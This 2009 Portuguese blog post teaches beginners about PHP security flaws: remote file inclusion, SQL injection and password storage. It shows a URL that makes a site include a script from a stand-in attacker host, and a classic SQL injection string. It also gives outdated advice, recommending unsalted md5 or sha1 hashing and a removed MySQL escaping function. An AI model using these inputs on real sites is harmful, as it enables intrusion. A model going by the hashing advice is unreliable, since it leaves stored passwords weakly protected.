---
layout: post
title: Principais falhas de segurança no PHP
excerpt: Veja um pouco sobre cada uma das principais falhas de segurança criadas pelos
  iniciantes em PHP e que podem deixar um site de portas abertas para o mundo...

date: '2009-03-24 20:08:33 -0300'
categories:
- PHP
- Artigos
- Segurança
tags: []
---
Hoje vou falar sobre alguns erros comuns que são cometidos por programadores que estão começando agora. Resolvi fazer esse post pois vejo diariamente em fóruns de PHP pessoas com erros em scripts que possuem rombos enormes de segurança...

Não prometo deixar o seu sistema tão protegido quanto o [](/arquivos/2009/03/cadillac-one.jpg) mas, sem dúvida, você vai evitar que muita gente faça um estrago considerável no seu site.

Se você se identificar com algumas dessas medidas não saia correndo e se jogue da ponte... Faça os devidos ajustes e tudo ficará bem.

#### Cuidados com a URL - Parte I
Uma falha muito comum são aqueles sites que, tentando usar um sistema "legal", acabam abusando da sorte... São sites que incluem o conteúdo <span style="color: #999999;">(via <strong>include()</strong>)</span> baseado em uma variável do método $_GET. Exemplo:


<div data-gist-id="78e86f3cc0df740e052e" data-gist-show-loading="false"></div>

E na URL do site ficaria:
<span style="color: #008080;">http://www.meusite.com.br/?<span style="color: #0000ff;">pagina=contato.php</span></span>

Com isso o "invasor" pode, por exemplo, colocar um caminho de um script externo no lugar da variável:
<span style="color: #008080;">http://www.meusite.com.br/?<span style="color: #0000ff;">pagina=<span style="color: #ff0000;">http://sitedumal.net/deleta-banco.php</span></span></span>

O seu site incluiria o arquivo normalmente e executaria tudo que existe dentro dele... O resto você já pode imaginar.

Evitar que isso aconteça é extremamente simples: é só criar um <em>array </em>contendo os nomes dos arquivos que poderão ser incluídos, dessa forma:


<div data-gist-id="66f462e6235cb54886c5" data-gist-show-loading="false"></div>

Viu? Adicionamos uma única linha e mais uma condição e está tudo resolvido. Com isso, se o atacante colocar lá o site dele na URL do seu site o PHP vai identificar que a variável <strong>$_GET['pagina']</strong> existe mas não está no <em>array </em><strong>$permitidos</strong>, então ele vai incluir o arquivo <strong>home.php</strong>.

#### Cuidados com a URL - Parte II
Outro erro comum é quando passamos parâmetros pela URL, por exemplo: o ID de uma categoria ou de um produto que, mais tarde, será buscado direto no banco para recolher algumas informações.

Geralmente o formato é o seguinte:
<span style="color: #008080;">http://www.meusite.com.br/produtos.php?<span style="color: #0000ff;">id=12</span></span>
ou
<span style="color: #008080;">http://www.meusite.com.br/?pagina=produtos.php&<span style="color: #0000ff;">id=12</span></span>

Com isso <span style="color: #999999;">(se você não se preparar) </span>você deixa uma porta aberta para um ataque famoso chamado <strong>SQL-Injection</strong> que nada mais é do que a inserção de um código SQL em um campo de texto ou parâmetro da URL que será enviado diretamente para o banco. Vamos a um exemplo:


<div data-gist-id="895837307c6471422cde" data-gist-show-loading="false"></div>

A sua consulta ao MySQL ficaria da seguinte forma:


<div data-gist-id="3e2c18893e43ac7c8501" data-gist-show-loading="false"></div>

Até aqui tudo bem.. Seu script funciona, você tem o que precisa e tá tudo na mais perfeita harmonia... Mas chega um <span style="text-decoration: line-through;">desocupado</span> invasor e modifica a sua URL deixando da seguinte forma:

<span style="color: #008080;">http://www.meusite.com.br/produtos.php?<span style="color: #0000ff;">id=<span style="color: #ff0000;">' OR 1=1 OR ''='</span> </span></span>

Agora a sua query MySQL fica assim:


<div data-gist-id="36b80fbd9ad256549c99" data-gist-show-loading="false"></div>

Viu o que aconteceu? As possíveis condições para a consulta ser verdadeira são: id igual a vazio, 1 igual a 1 e vazio igual a vazio... Essa consulta vai ser dada como verdadeira e todos os produtos serão retornados. Sim meu amigo, é o fim do mundo.

Mas, como eu disse, não estou aqui para te assustar e sim para mostrar como resolver o pepino... Vamos a uma atitude simples mas que te salvará do Apocalipse... É só mudar uma linha:


<div data-gist-id="2e89035075f568e757c9" data-gist-show-loading="false"></div>

Com isso eu digo que valor da variável <strong>$produto</strong> será igual ao <strong>valor inteiro</strong> <span style="color: #999999;">(<em>int </em>de integer)</span> da variável <strong>$_GET['id']</strong>. Problema resolvido meus caros!

Se o atacante colocar uma string como parâmetro <span style="color: #999999;">(todo SQL-Injection é uma string)</span> ela será convertida para inteiro... E o valor inteiro de uma string é igual a zero.  8-)

Peço <span style="color: #ff0000;"><strong>atenção dobrada</strong></span> para o entendimento desse último exemplo pois o <strong>SQL-Injection</strong> é o ataque mais comum dos últimos tempos.

Caso você passe parâmetros via URL que são strings e não números inteiros, você pode usar a função <strong>mysql_real_escape_string()</strong> da seguinte forma:


<div data-gist-id="a0a6d55db4580f380175" data-gist-show-loading="false"></div>

Com isso você evita o uso de aspas e caracteres protegidos do MySQL mantendo a sua <em>query </em>segura. Esse caso também vale para formulários dos quais os dados vão direto para consultas MySQL <span style="color: #999999;">(formulários de login, cadastro e comentários, por exemplo)</span>.

#### Sobre Usuários e Senhas
Outro ponto muito importante é não exibir, em momento algum, o nome de login <span style="color: #999999;">(usuário)</span> de algum usuário cadastrado no sistema. Lembre-se que para um usuário conseguir invadir a conta do outro ele precisa de duas coisas: usuário <span style="color: #999999;">(ou e-mail)</span> e a senha.. Se ele souber o usuário já tem 50% de sucesso.

Vale lembrar também que você <strong>não precisa</strong> deixar a senha do usuário na forma real quando salva-la no banco. É muito mais seguro salvar um <strong>md5() </strong>ou <strong>sha1()</strong> da senha no banco e quando for necessário fazer a validação do usuário você também gera o <strong>md5()</strong> ou <strong>sha1()</strong> da senha que ele digitou e compara com o que há no banco. Assim, se por ventura alguém conseguir invadir e pegar todos os registros do banco de usuários, o máximo que ele irá conseguir são o usuário/e-mail e uma senha criptografada.

Se quiser saber como funciona criptografica no PHP é só ver esse post:» [Criptografia no PHP usando md5, sha1 e base64](/criptografia-no-php-usando-md5-sha1-e-base64)

Espero que tenham gostado. :)

